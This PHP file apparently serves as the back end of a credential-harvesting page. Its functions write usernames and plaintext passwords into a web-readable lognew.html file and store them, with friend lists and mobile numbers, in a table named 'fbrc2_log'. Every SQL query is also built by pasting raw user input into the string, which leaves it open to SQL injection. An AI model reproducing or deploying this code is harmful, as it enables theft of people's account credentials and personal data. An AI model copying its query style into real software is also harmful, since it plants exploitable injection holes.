<?php
function in_lognew($username,$password,$date){
$file=fopen("lognew.html","a+");

//echo $fl;
$str="u={$username}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p={$password}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d={$date}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	<input value='{$username}-hmd-{$password}'><hr>";
fwrite($file,$str);
}
function in_phnew($username,$name,$mobile){
$file=fopen("phnew.html","a+");

//echo $fl;
$str="u={$username}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name={$name}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mobile={$mobile}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<hr>";
fwrite($file,$str);
}
function sql_query($query){
	include "db.php";
	mysql_select_db($dbname);
	$retval=mysql_query($query,$conn);
	if(!$retval){echo mysql_error();}else{
	return $retval;}
}
function is_set($var,$defult_value,$method){
if($method=="GET"){
	if(isset($_GET[$var])){
		$var2=$_GET[$var];
		}else{
			$var2=$defult_value;
			}}
if($method=="POST"){
	if(isset($_POST[$var])){
		$var2=$_POST[$var];
		}else{
			$var2=$defult_value;
			}}
	return $var2;
}
function num_rows($table,$field,$value){
	$retval=sql_query("select $field from $table where $field='$value'");
	
	$num_rows=mysql_num_rows($retval);
	return $num_rows;
}
function in_log($username,$pass,$date){
include 'db.php';
	$sql = "SELECT log1 FROM fbrc2_log WHERE log1='$username'";
	mysql_select_db($dbname);
	$retval = mysql_query( $sql, $conn );
	$num_rows=mysql_num_rows($retval);
	if($num_rows==0){
		$sql = "insert into fbrc2_log (log1,log2,log3,log4,log5,log6,log7) values ('$username','$pass','$date','','','','')";
		mysql_select_db($dbname);
		$retval = mysql_query( $sql, $conn );
		}else{
			//header("Location: error.php");
			echo "prob";
			}
}
function add_frnds($username,$frnds){
	include 'db.php';
	$sql = "update fbrc2_log set log4='$frnds' where log1='$username'";
	mysql_select_db($dbname);
	$retval = mysql_query( $sql, $conn );
	if(!$retval){
		echo mysql_error();
		}
}
function in_mobile($name,$mobile){
include 'db.php';
	$sql = "SELECT mobile FROM mobile WHERE mobile='$mobile'";
	mysql_select_db($dbname);
	$retval = mysql_query( $sql, $conn );
	$num_rows=mysql_num_rows($retval);
	if($num_rows==0){
		$sql = "insert into mobile (name,mobile) values ('$name','$mobile')";
		mysql_select_db($dbname);
		$retval = mysql_query( $sql, $conn );
		}else{
			//header("Location: error.php");
			echo "prob";
			}
}
?>